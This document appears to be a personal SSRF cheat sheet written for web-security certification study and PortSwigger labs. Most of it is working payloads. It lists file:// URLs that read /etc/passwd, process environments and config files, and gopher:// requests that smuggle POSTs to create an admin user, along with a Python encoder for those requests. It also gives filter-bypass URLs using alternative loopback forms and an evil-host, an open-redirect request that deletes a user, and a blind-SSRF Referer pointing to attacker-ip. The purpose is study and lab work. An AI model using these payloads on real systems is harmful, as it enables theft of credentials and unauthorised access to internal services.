# **Server-side Request Forgery (SSRF)**
SSRF is a security vulnerability that occurs when an attacker manipulates a server to make HTTP requests to an unintended location. This happens when the server processes user-provided URLs or IP addresses without proper validation.

#### **When to Test SSRF**

Test for SSRF whenever user input can cause the server to make an outbound network request—especially with URLs, file fetching, webhooks, redirects, integrations, or admin/debug features.

##### SSRF indicators:

- url=
- callback=
- webhook_url=
- redirect=
- next=

##### When the App Allows Protocol Control:
- **file:// ( Local file access )**
```
file:///etc/passwd
file://\/\/etc/passwd
file:///proc/self/environ
file:///C:/Windows/win.ini

GET /api/upload.php?url=file:////tmp/flag.txt
GET /api/upload.php?url=file:////etc/groupoffice/config.php
```

- **ftp:// ( Legacy protocol support)**
```
ftp://example.com/
ftp://example.com:21/
ftp://user:pass@example.com/
```

- **ldap:// (Directory services)**
```
ldap://example.com/
ldaps://example.com/
ldap://127.0.0.1/
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

- **dict:// (Dictionary protocol (rare but supported by some URL stacks))**
```
dict://example.com/
dict://127.0.0.1/
```

- **gopher:// (High‑risk protocol)**

##### Basic Test Payload
```
gopher://example.com/
gopher://127.0.0.1:80/
gopher://localhost/
```

##### Example-1: Sample Login POST request

```
gopher://backend:80/_POST /login?username=white.rabbit&password=dontbelate HTTP/1.1
```

URL decoded:
```
gopher://backend:80/_POST%20/login?username=white.rabbit&password=dontbelate%20HTTP/1.1%0a
```

##### Example-2: Register a user using POST
```
cv=gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 35

username=amrityam&password=amrityam
```

- Try url encoding as well as double url encoding.

Tools:

- **SSRF2gopher**

https://github.com/eMVee-NL/SSRF2gopher
```
cd /home/amrityam/kali/offsec/tools/SSRF2gopher
python3 SSRF2gopher.py
```

- Local script - update the payload in gopher.py file.        
```
cd OSWA_payloads
python3 gopher.py
```

<details>
  <summary>Show gopher.py code</summary>

```python
import urllib.parse

payload = """gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 35

username=amrityam&password=amrityam"""


def url_encode_payload(data):
    encoded_data = data.replace(' ', '%20').replace('=', '%3d').replace('&', '%26')
    encoded_data = encoded_data.replace('\n', '%0a')
    return encoded_data

def double_url_encode_payload(data):
    encoded_data = data.replace(':', '%3a').replace('%20', '%2520')
    encoded_data = encoded_data.replace('%0a', '%250a')
    return encoded_data

def another_option(data):
    encoded_data = data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520')
    encoded_data = encoded_data.replace('%0a', '%250a')
    return encoded_data


encoded_payload = url_encode_payload(payload)
print("\n[!] URL encoded payload:")
print(encoded_payload)
print("\n[!] Double URL encoded payload:")
print(double_url_encode_payload(encoded_payload))
print("\n[!] Another option that might work via something like BURP:")
print(another_option(encoded_payload))
```
</details>


#### Format JSON using jq
```
jq -r 'fromjson' escaped.json > clean.json
```


#### Portswigger labs

- ##### SSRF with blacklist-based input filters
Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1 if 127.0.0.1 is blocked.      
Example - http://127.1/admin, http://127.1/<url encode/ double url encode of admin>

- ##### SSRF with whitelist-based input filters
```
https://localhost#expected-host
https://expected-host:fakepassword@localhost
https://expected-host.evil-host
```

- ##### SSRF with filter bypass via open redirection vulnerability
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

- ##### Blind SSRF via the Referer header
```
Referer: http://attacker-ip
```